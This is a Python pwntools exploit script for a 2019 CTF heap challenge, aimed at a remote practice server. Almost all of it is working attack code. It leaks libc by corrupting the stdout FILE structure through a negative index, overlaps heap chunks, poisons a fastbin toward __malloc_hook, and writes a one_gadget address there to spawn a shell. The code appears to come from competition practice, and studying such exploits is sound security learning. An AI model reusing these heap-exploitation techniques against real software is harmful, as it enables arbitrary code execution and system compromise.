#!//usr/bin/python
#-*- coding:utf-8-*-
from pwn import *
context.binary = ELF("./nsctf_online_2019_pwn1")
context.log_level = 'debug'
elf = context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, 'b* 0xec9')
	raw_input()

def menu(ch):
	p.sendlineafter('5.exit', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('size:', str(size))
	p.sendafter('content:', content)
	print "add a chunk!"

def free(idx):
	menu(2)
	p.sendlineafter('index:', str(idx))

def edit(idx, size, content):
	menu(4)
	p.sendlineafter('index:', str(idx))
	p.sendlineafter('size:', str(size))
	p.sendafter('content:', content)

def exploit():

	edit(-16, 0x21, p64(0xfbad1800) + p64(0)*3 + '\x00')
	data = p.recvuntil('5.exit')
	print "data ==> " + data
  	leak = u64(data[0x19:0x20].ljust(8, '\x00'))                                 #io_file jump
  	print "leak ==> " + hex(leak)
	libc_base = leak - libc.symbols['_IO_file_jumps']
	print "libc_base ==> " + hex(libc_base)
	__malloc_hook = libc_base + libc.symbols['__malloc_hook']

	#add(0x88, 'a'*0x10)			#0
	p.sendline('1')
	p.sendlineafter('size:', str(0x88))
	p.sendafter('content:', 'a'*0x10)
	add(0x218, 'b'*0x10)		#1
	add(0x108, 'c'*0x10)		#2
	add(0x80, 'd'*0x10)			#3


	#fake
	edit(1, 0x100, 'a'*0xf0 + p64(0x100) + p64(0x101))
	#into unsorted bin
	free(1)
	free(0)
	add(0x88, 'a'*0x10)
	edit(0, 0x88, 'a'*0x88)

	#split from 1					
	add(0x88, 'b1')				#1
	add(0x68, 'b2')				#4
	add(0x88, 'b3')				#5

	free(1)		
	free(2)						#overlapping above b

	free(4)						#into fastbin

	add(0x78, 'over')			#1

	#leak libc
	#dbg()
	add(0x78, p64(0x80) + p64(0x71) + p64(__malloc_hook-0x23))	#2, contain fastbin

	gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	add(0x68, 'padding')
	add(0x68, 'a'*0x13 + p64(libc_base + gadgets[3]))

	p.sendline('1')
	p.sendlineafter('size:', str(0x10))
	

	p.interactive()
	p.close()


if __name__ == '__main__':
	#p = process("./nsctf_online_2019_pwn1")
	p = remote('node3.buuoj.cn', 28561)
	exploit()